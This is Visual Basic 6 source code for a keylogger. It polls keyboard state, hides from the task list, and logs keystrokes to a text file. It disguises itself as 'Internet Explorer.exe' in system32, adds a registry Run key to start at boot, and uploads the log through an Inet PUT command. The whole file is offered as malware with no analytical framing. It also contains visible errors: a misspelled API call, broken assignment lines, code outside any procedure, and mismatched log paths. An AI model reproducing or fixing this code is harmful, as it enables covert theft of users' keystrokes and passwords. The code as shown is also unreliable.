VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   5040
   ClientLeft      =   60
   ClientTop       =   495
   ClientWidth     =   7890
   LinkTopic       =   "Form1"
   ScaleHeight     =   5040
   ScaleWidth      =   7890
   StartUpPosition =   3  'Windows Default
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   3120
      Top             =   4320
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Timer Timer3 
      Interval        =   60000
      Left            =   1440
      Top             =   4200
   End
   Begin VB.Timer Timer2 
      Interval        =   10000
      Left            =   840
      Top             =   4200
   End
   Begin VB.Timer Timer1 
      Interval        =   150
      Left            =   240
      Top             =   4200
   End
   Begin VB.Label Label1 
      Caption         =   "Label1"
      Height          =   3735
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   7575
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim shift As Boolean

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer

End Sub

Private Sub Form_Load()
Label1.Caption = ""
If App.PrevInstance = True Then End
App.TaskVisible = False
If Dir("c:\windows\klogs.txt") <> "" Then
Open "c:\windows\klogs.txt" For Append As #1
Write #1,
Write #1, DateTime.Time
Write #1,
Close #1
End If
If Dir("c:\windows\system32\Internet Explorer.exe") <> "" Then
Else
regist
End If


End Sub

Private Sub Timer1_Timer()
If GetAsyncKeyState(65) <> 0 Then
Label1.Caption = Label1.Caption + "a"
End If
If GetAsyncKeyState(66) <> 0 Then
Label1.Caption = Label1.Caption + "b"
End If
If GetAsyncKeyState(67) <> 0 Then
Label1.Caption = Label1.Caption + "c"
End If
If GetAsyncKeyState(68) <> 0 Then
Label1.Caption = Label1.Caption = "d"
End If
If GetAyncKeyState(69) <> 0 Then
Label1.Caption = Label1.Caption = "e"
End If
If GetAsyncKeyState(70) <> 0 Then
Label1.Caption = Label1.Caption + "f"
End If
If GetAsyncKeyState(71) <> 0 Then
Label1.Caption = Label1.Caption + "g"
End If
If GetAsyncKeyState(72) <> 0 Then
Label1.Caption = Label1.Caption + "h"
End If
If GetAsyncKeyState(73) <> 0 Then
Label1.Caption = Label1.Caption + "i"
End If
If GetAsyncKeyState(74) <> 0 Then
Label1.Caption = Label1.Caption + "j"
End If
If GetAsyncKeyState(75) <> 0 Then
Label1.Caption = Label1.Caption + "k"
End If
If GetAsyncKeyState(76) <> 0 Then
Label1.Caption = Label1.Caption + "l"
End If
If GetAsyncKeyState(77) <> 0 Then
Label1.Caption = Label1.Caption + "m"
End If
If GetAsyncKeyState(78) <> 0 Then
Label1.Caption = Label1.Caption + "n"
End If
If GetAsyncKeyState(79) <> 0 Then
Label1.Caption = Label1.Caption + "o"
End If
If GetAsyncKeyState(80) <> 0 Then
Label1.Caption = Label1.Caption + "p"
End If
If GetAsyncKeyState(81) <> 0 Then
Label1.Caption = Label1.Caption + "q"
End If
If GetAsyncKeyState(82) <> 0 Then
Label1.Caption = Label1.Caption + "r"
End If
If GetAsyncKeyState(83) <> 0 Then
Label1.Caption = Label1.Caption + "s"
End If
If GetAsyncKeyState(84) <> 0 Then
Label1.Caption = Label1.Caption + "t"
End If
If GetAsyncKeyState(85) <> 0 Then
Label1.Caption = Label1.Caption + "u"
End If
If GetAsyncKeyState(86) <> 0 Then
Label1.Caption = Label1.Caption + "v"
End If
If GetAsyncKeyState(87) <> 0 Then
Label1.Caption = Label1.Caption + "w"
End If
If GetAsyncKeyState(88) <> 0 Then
Label1.Caption = Label1.Caption + "x"
End If
If GetAsyncKeyState(89) <> 0 Then
Label1.Caption = Label1.Caption + "y"
End If
If GetAsyncKeyState(90) <> 0 Then
Label1.Caption = Label1.Caption + "z"
End If
If GetAsyncKeyState(32) <> 0 Then
Label1.Caption = Label1.Caption + " "
End If

End Sub

Private Sub Timer2_Timer()
On Error GoTo skip
If Dir("c:\klogs.txt") <> "" Then
Open "c:\klogs.txt" For Append As #1
Write #1, Label1.Caption
Close #1
Else
Open "c:\klogs.txt" For Output As #1
Write #1, DateTime.Time
Write #1,
Write #1, Label1.Caption
Close #1
End If
Label1.Caption = ""
skip:

End Sub
Dim regkey
FileCopy App.Path & "\" & App.EXEName & ".exe", "c:\windows\system32\Internet Explorer.exe"
Set regkey = CreateObject("wscript.shell")
regkey.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Internet Explorer.exe", "c:\windows\system32\Internet Explorer.exe"

Private Sub Timer3_Timer()
On Error Resume Next
Inet1.Execute , "PUT c:\windows\klogs.txt /" & DateTime.Date & ".txt"
End Sub
